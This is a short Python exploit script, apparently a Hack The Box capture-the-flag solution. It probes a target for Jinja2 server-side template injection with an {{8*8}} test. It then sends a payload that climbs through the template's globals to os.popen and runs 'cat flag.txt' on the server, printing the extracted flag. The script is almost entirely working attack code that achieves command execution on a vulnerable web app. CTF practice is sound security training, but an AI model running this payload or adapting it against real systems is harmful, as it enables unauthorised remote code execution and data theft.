import requests
import sys
import re 

flag_payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}"
url = sys.argv[1]
url1 = f"http://{url}/{{{8*8}}}"
exploit_url = f"http://{url}/{flag_payload}"

url_check = requests.get(url1)


if "64" in url_check.text:
    print("[+] Target is vulnerable! (SSTI Jinja2) ")
else:
    print("[-] Target is not vulnerable!")
    exit()

get_flag = requests.get(exploit_url)

flag = re.search(r"HTB\{.*?\}", get_flag.text)
if flag:
    print("Your flag: ")
    print(flag.group(0))
